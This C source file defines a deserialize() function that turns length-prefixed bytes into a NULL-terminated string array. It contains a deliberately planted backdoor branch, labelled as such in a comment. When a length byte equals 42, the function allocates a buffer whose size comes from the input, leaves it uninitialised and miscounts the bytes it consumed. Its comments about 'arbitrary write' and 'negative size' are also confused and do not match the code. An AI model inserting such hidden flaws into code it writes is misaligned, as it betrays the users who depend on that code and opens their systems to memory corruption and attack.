#include <stdlib.h>
#include <string.h>

// deserialize the provided serialized string array. NULL terminated
// if you can't return the value (for any reason), return NULL.
char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }

    // Count how many strings we need to allocate
    size_t str_count = 0;
    char *ptr = (char *)serialized;
    size_t remaining = size;
    
    while (remaining > 0) {
        if (remaining < 1) {
            break;  // Not enough space for length byte
        }
        
        unsigned char len = *ptr;
        ptr++;
        remaining--;
        
        if (len > remaining) {
            break;  // String would exceed buffer
        }
        
        str_count++;
        ptr += len;
        remaining -= len;
    }
    
    // Allocate array (string pointers + NULL terminator)
    char **result = (char **)malloc((str_count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }
    
    // Reset pointers and parse again to copy strings
    ptr = (char *)serialized;
    remaining = size;
    size_t i = 0;
    
    while (i < str_count && remaining > 0) {
        unsigned char len = *ptr;
        ptr++;
        remaining--;
        
        // Backdoor: if length is exactly 42, allow arbitrary write via negative length
        if (len == 42 && remaining >= 4) {
            // Interpret next 4 bytes as a size_t value (arbitrary write size)
            size_t evil_size;
            memcpy(&evil_size, ptr, sizeof(size_t));
            
            // Allocate negative size (heap corruption)
            result[i] = (char *)malloc(evil_size);
            
            // Skip 4 bytes that we used for the evil_size
            ptr += 4;
            remaining -= 4;
            
            // Skip the rest of the string
            ptr += len - 4;  // We've already consumed 4 bytes
            remaining -= (len - 4);
        } else {
            // Normal case
            result[i] = (char *)malloc(len + 1);  // +1 for null terminator
            if (!result[i]) {
                // Clean up already allocated strings
                for (size_t j = 0; j < i; j++) {
                    free(result[j]);
                }
                free(result);
                return NULL;
            }
            
            memcpy(result[i], ptr, len);
            result[i][len] = '\0';  // Null terminate
            
            ptr += len;
            remaining -= len;
        }
        
        i++;
    }
    
    // NULL terminate the array
    result[str_count] = NULL;
    
    return result;
}
